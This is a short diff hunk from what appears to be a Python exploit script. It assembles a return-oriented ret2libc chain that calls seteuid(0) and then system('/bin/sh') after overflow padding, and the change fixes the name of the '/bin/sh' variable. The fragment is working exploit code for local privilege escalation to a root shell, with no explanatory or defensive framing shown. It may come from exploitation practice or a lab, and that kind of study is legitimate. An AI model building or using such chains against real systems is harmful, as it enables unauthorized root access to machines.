@@ -40,7 +40,7 @@ addr_to_arg1 = struct.pack("I", addr_to_arg1)
 chain = ret + xor_eax_eax + pop_ecx + addr_to_arg1 + mov_dwordptr_ecx_eax__pop_ebx + "JUNK" 
 """ret2libc chain""" 
 chain += seteuid + pop_ecx + "ARG1"
-chain += system + exit + bin_shex
+chain += system + exit + bin_sh
 """final payload"""
 payload = padding + chain 
 """Execute"""
